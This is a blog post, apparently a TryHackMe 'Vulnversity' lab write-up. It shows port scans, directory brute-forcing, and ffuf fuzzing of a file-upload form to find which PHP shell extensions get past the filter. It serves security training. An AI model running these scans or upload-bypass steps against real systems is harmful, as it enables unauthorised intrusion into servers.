<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="TryHackMe Vulnvercity write-up" /><meta property="og:locale" content="en" /><meta name="description" content="Setup" /><meta property="og:description" content="Setup" /><link rel="canonical" href="https://zhhivan.github.io/posts/THM-Vulnvercity-Writeup/" /><meta property="og:url" content="https://zhhivan.github.io/posts/THM-Vulnvercity-Writeup/" /><meta property="og:site_name" content="Ivan Zhao" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-02-24T00:28:30+13:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TryHackMe Vulnvercity write-up" /><meta name="twitter:site" content="@zhhivan" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-02-24T00:39:24+13:00","datePublished":"2023-02-24T00:28:30+13:00","description":"Setup","headline":"TryHackMe Vulnvercity write-up","mainEntityOfPage":{"@type":"WebPage","@id":"https://zhhivan.github.io/posts/THM-Vulnvercity-Writeup/"},"url":"https://zhhivan.github.io/posts/THM-Vulnvercity-Writeup/"}</script><title>TryHackMe Vulnvercity write-up | Ivan Zhao</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ivan Zhao"><meta name="application-name" content="Ivan Zhao"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://avatars.githubusercontent.com/u/10976311?v=4 " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ivan Zhao</a></div><div class="site-subtitle font-italic">Ivan's personal blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/zhhivan" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/zhhivan" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ivan','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>TryHackMe Vulnvercity write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>TryHackMe Vulnvercity write-up</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Ivan Zhao</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1677151710" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-02-24 </em> </span> <span> Updated <em class="timeago" data-ts="1677152364" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-02-23 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2440 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><h2 id="setup"><span class="mr-2">Setup</span><a href="#setup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">export </span><span class="nv">ip</span><span class="o">=</span>10.10.x.x

<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$ip</span><span class="s2"> example.com"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h2 id="1-recon"><span class="mr-2">1, recon</span><a href="#1-recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
</pre><td class="rouge-code"><pre>
Starting Nmap 7.60 <span class="o">(</span> <span class="o">[</span>https://nmap.org]<span class="o">(</span>https://nmap.org<span class="o">)</span> <span class="o">)</span> at 2023-01-14 08:10 GMT

Nmap scan report <span class="k">for </span>ip-10-10-251-165.eu-west-1.compute.internal <span class="o">(</span>10.10.251.165<span class="o">)</span>

Host is up <span class="o">(</span>0.0010s latency<span class="o">)</span><span class="nb">.</span>

Not shown: 994 closed ports

PORT     STATE SERVICE     VERSION

21/tcp   open  ftp         vsftpd 3.0.3

22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>

139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>

445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>

3128/tcp open  http-proxy  Squid http proxy 3.5.12

3333/tcp open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>

MAC Address: 02:AE:04:9C:7F:A3 <span class="o">(</span>Unknown<span class="o">)</span>

Service Info: Host: VULNUNIVERSITY<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <span class="o">[</span>https://nmap.org/submit/]<span class="o">(</span>https://nmap.org/submit/<span class="o">)</span> <span class="nb">.</span>

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>23.28 seconds

<span class="nv">$ </span><span class="nb">time sudo </span>rustscan <span class="nt">--ulimit</span> 5000 <span class="nt">-a</span> 10.10.54.166 <span class="nt">--</span> <span class="nt">-A</span> <span class="nt">-oA</span> nmap/rust-open-port

Open 10.10.54.166:22                                                                                                                           

Open 10.10.54.166:21                                                                                                                           

Open 10.10.54.166:139                                                                                                                          

Open 10.10.54.166:445                                                                                                                          

Open 10.10.54.166:3128                                                                                                                         

Open 10.10.54.166:3333

PORT     STATE SERVICE     REASON         VERSION

21/tcp   open  ftp         syn-ack ttl 61 vsftpd 3.0.3

22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>

| ssh-hostkey:

|   2048 5a4ffcb8c8761cb5851cacb286411c5a <span class="o">(</span>RSA<span class="o">)</span>

| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn

|   256 ac9dec44610c28850088e968e9d0cb3d <span class="o">(</span>ECDSA<span class="o">)</span>

| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE<span class="o">=</span>

|   256 3050cb705a865722cb52d93634dca558 <span class="o">(</span>ED25519<span class="o">)</span>

|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB

139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>

445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>

3128/tcp open  http-proxy  syn-ack ttl 61 Squid http proxy 3.5.12

|_http-server-header: squid/3.5.12

|_http-title: ERROR: The requested URL could not be retrieved

3333/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>

|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>

| http-methods:

|_  Supported Methods: GET HEAD POST OPTIONS

|_http-title: Vuln University

<span class="nv">$ </span>whatweb 10.10.2.187:3333

<span class="o">[</span>http://10.10.2.187:3333]<span class="o">(</span>http://10.10.2.187:3333<span class="o">)</span> <span class="o">[</span>200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], Email[info@yourdomain.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.2.187], JQuery, Script, Title[Vuln University]
</pre></table></code></div></div><h1 id="2enum">2,enum</h1><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
</pre><td class="rouge-code"><pre>
<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> <span class="o">[</span>http://10.10.54.166:3333/FUZZ/]<span class="o">(</span>http://10.10.54.166:3333/FUZZ/<span class="o">)</span> <span class="nt">-e</span> .php,.txt,.bak <span class="nt">-fc</span> 403

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\      

       /\ \__/ /\ \__/  __  __  /\ \__/      

       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\     

        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/     

         \ \_\   \ \_\  \ \____/  \ \_\      

          \/_/    \/_/   \/___/    \/_/      

       v1.5.0 Kali Exclusive &lt;3

________________________________________________

 :: Method           : GET

 :: URL              : [http://10.10.54.166:3333/FUZZ](http://10.10.54.166:3333/FUZZ)

 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt

 :: Extensions       : .txt .bak

 :: Follow redirects : false

 :: Calibration      : false

 :: Timeout          : 10

 :: Threads          : 40

 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500

 :: Filter           : Response status: 403

________________________________________________

css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 276ms]

fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 275ms]

images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 279ms]

index.html              [Status: 200, Size: 33014, Words: 8161, Lines: 653, Duration: 278ms]

internal                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 276ms]

js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 280ms]

:: Progress: [14139/14139] :: Job [1/1] :: 143 req/sec :: Duration: [0:01:39] :: Errors: 0 ::

Internal has web form for upload

We will fuzz the allowed list of file extensions

Content of request.txt

POST /internal/index.php HTTP/1.1

Host: vulnuniversity.thm:3333

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data; boundary=---------------------------277558272405201676361856688

Content-Length: 338

Origin: [http://vulnuniversity.thm:3333](http://vulnuniversity.thm:3333)

Connection: close

Referer: [http://vulnuniversity.thm:3333/internal/](http://vulnuniversity.thm:3333/internal/)

Upgrade-Insecure-Requests: 1

DNT: 1

Sec-GPC: 1

-----------------------------277558272405201676361856688

Content-Disposition: form-data; name="file"; filename="shell.FUZZ"

Content-Type: application/x-php

-----------------------------277558272405201676361856688

Content-Disposition: form-data; name="submit"

Submit

-----------------------------277558272405201676361856688--

$ ffuf -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt -X POST -request request.txt -d '' -u [http://vulnuniversity.thm:3333/internal/index.php](http://vulnuniversity.thm:3333/internal/index.php)

$ ffuf -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt -X POST -request request.txt -d '' -u [http://vulnunive](http://vulnunive)

rsity.thm:3333/internal/index.php                                                                                            

        /'</span>___<span class="se">\ </span> /<span class="s1">'___\           /'</span>___<span class="se">\ </span>                                                                                     

       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/                                                                                      

       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>                                                                                    

        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/                                                                                     

         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>                                                                                     

          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/                                                                                      

       v1.5.0 Kali Exclusive &lt;3                                                                                              

________________________________________________                                                                             

 :: Method           : POST                                                                                                  

 :: URL              : <span class="o">[</span>http://vulnuniversity.thm:3333/internal/index.php]<span class="o">(</span>http://vulnuniversity.thm:3333/internal/index.php<span class="o">)</span>                                                     

 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt                                     

 :: Header           : User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0                    

 :: Header           : Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5                                                                       

 :: Header           : Accept-Encoding: <span class="nb">gzip</span>, deflate                                                                        

 :: Header           : Host: vulnuniversity.thm:3333                                                                         

 :: Header           : Content-Type: multipart/form-data<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="nt">---------------------------277558272405201676361856688</span>    

 :: Header           : Origin: <span class="o">[</span>http://vulnuniversity.thm:3333]<span class="o">(</span>http://vulnuniversity.thm:3333<span class="o">)</span>                                                                

 :: Header           : Connection: close                                                                                     

 :: Header           : Referer: <span class="o">[</span>http://vulnuniversity.thm:3333/internal/]<span class="o">(</span>http://vulnuniversity.thm:3333/internal/<span class="o">)</span>                                                     

 :: Header           : Upgrade-Insecure-Requests: 1                                                                          

 :: Header           : DNT: 1                                                                                                

 :: Header           : Sec-GPC: 1                                                                                            

 :: Header           : Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/avif,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8         

 :: Data             : <span class="nt">-----------------------------277558272405201676361856688</span>                                              

Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"file"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">"shell.FUZZ"</span>                                                           

Content-Type: application/x-php

<span class="nt">-----------------------------277558272405201676361856688</span>

Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"submit"</span>

Submit

<span class="nt">-----------------------------277558272405201676361856688--</span>

 :: Follow redirects : <span class="nb">false</span>

 :: Calibration      : <span class="nb">false</span>

 :: Timeout          : 10

 :: Threads          : 40

 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500

________________________________________________

xls                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 274ms]

zip                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 275ms]

pdf                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 276ms]

conf                    <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 278ms]

php3                    <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 279ms]

py                      <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 280ms]                                        

phtm                    <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 279ms]                                        

asp                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 280ms]                                        

shtml                   <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 279ms]                                        

cfg                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 280ms]                                        

jsp                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 550ms]                                        

xlsx                    <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 553ms]                                        

php4                    <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 553ms]                                        

pl                      <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 556ms]                                        

tgz                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]                                        

rb                      <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]

php                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]

php5                    <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 557ms]

tar.gz                  <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 558ms]

cfm                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 558ms]

txt                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 825ms]

docx                    <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 830ms]

gz                      <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 830ms]

shtm                    <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 832ms]

doc                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 832ms]

aspx                    <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 832ms]

jhtml                   <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 833ms]

<span class="nb">tar</span>                     <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 833ms]

phtml                   <span class="o">[</span>Status: 200, Size: 325, Words: 3, Lines: 2, Duration: 833ms]

cfml                    <span class="o">[</span>Status: 200, Size: 336, Words: 2, Lines: 2, Duration: 833ms]

:: Progress: <span class="o">[</span>30/30] :: Job <span class="o">[</span>1/1] :: 47 req/sec :: Duration: <span class="o">[</span>0:00:01] :: Errors: 0 ::
</pre></table></code></div></div><p>New added 14/01/2023</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre><td class="rouge-code"><pre><span class="c"># gobuster dir -u [http://$ip:3333](http://$ip:3333) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>

<span class="c"># gobuster dir -u [http://10.10.251.165:3333](http://10.10.251.165:3333) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>

<span class="o">===============================================================</span>

Gobuster v3.0.1

by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>

<span class="o">===============================================================</span>

<span class="o">[</span>+] Url:            <span class="o">[</span>http://10.10.251.165:3333]<span class="o">(</span>http://10.10.251.165:3333<span class="o">)</span>

<span class="o">[</span>+] Threads:        10

<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403

<span class="o">[</span>+] User Agent:     gobuster/3.0.1

<span class="o">[</span>+] Timeout:        10s

<span class="o">===============================================================</span>

2023/01/14 08:50:41 Starting gobuster

<span class="o">===============================================================</span>

/images <span class="o">(</span>Status: 301<span class="o">)</span>

/css <span class="o">(</span>Status: 301<span class="o">)</span>

/js <span class="o">(</span>Status: 301<span class="o">)</span>

/fonts <span class="o">(</span>Status: 301<span class="o">)</span>

/internal <span class="o">(</span>Status: 301<span class="o">)</span>

/server-status <span class="o">(</span>Status: 403<span class="o">)</span>

<span class="o">===============================================================</span>

2023/01/14 08:51:00 Finished

<span class="o">===============================================================</span>

</pre></table></code></div></div><p>The parameter -L will let curl to follow 301 redirect</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre><span class="c1"># curl -L [http://10.10.251.165:3333/internal](http://10.10.251.165:3333/internal)</span>

<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">link</span> <span class="n">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="n">type</span><span class="o">=</span><span class="s2">"text/css"</span> <span class="n">href</span><span class="o">=</span><span class="s2">"css/bootstrap.min.css"</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">style</span><span class="o">&gt;</span>

<span class="n">html</span><span class="p">,</span> <span class="n">body</span> <span class="p">{</span>

<span class="err">   </span> <span class="n">height</span><span class="o">:</span> <span class="mi">30</span><span class="o">%</span><span class="p">;</span>

<span class="p">}</span>

<span class="n">html</span> <span class="p">{</span>

<span class="err">   </span> <span class="n">display</span><span class="o">:</span> <span class="n">table</span><span class="p">;</span>

<span class="err">   </span> <span class="n">margin</span><span class="o">:</span> <span class="n">auto</span><span class="p">;</span>

<span class="p">}</span>

<span class="n">body</span> <span class="p">{</span>

<span class="err">   </span> <span class="n">display</span><span class="o">:</span> <span class="n">table</span><span class="o">-</span><span class="n">cell</span><span class="p">;</span>

<span class="err">   </span> <span class="n">vertical</span><span class="o">-</span><span class="n">align</span><span class="o">:</span> <span class="n">middle</span><span class="p">;</span>

<span class="err">   </span> <span class="n">text</span><span class="o">-</span><span class="n">align</span><span class="o">:</span> <span class="n">center</span><span class="p">;</span>

<span class="p">}</span>

<span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;</span>

<span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">form</span> <span class="n">action</span><span class="o">=</span><span class="s2">"index.php"</span> <span class="n">method</span><span class="o">=</span><span class="s2">"post"</span> <span class="n">enctype</span><span class="o">=</span><span class="s2">"multipart/form-data"</span><span class="o">&gt;</span>

<span class="err">   </span> <span class="o">&lt;</span><span class="n">h3</span><span class="o">&gt;</span><span class="nc">Upload</span><span class="o">&lt;/</span><span class="n">h3</span><span class="o">&gt;&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>

<span class="err">   </span> <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s2">"file"</span> <span class="n">name</span><span class="o">=</span><span class="s2">"file"</span> <span class="n">id</span><span class="o">=</span><span class="s2">"file"</span><span class="o">&gt;</span>

<span class="err">   </span> <span class="o">&lt;</span><span class="n">input</span> <span class="n">class</span><span class="o">=</span><span class="s2">"btn btn-primary"</span> <span class="n">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="n">value</span><span class="o">=</span><span class="s2">"Submit"</span> <span class="n">name</span><span class="o">=</span><span class="s2">"submit"</span><span class="o">&gt;</span>

<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>

<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>

<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
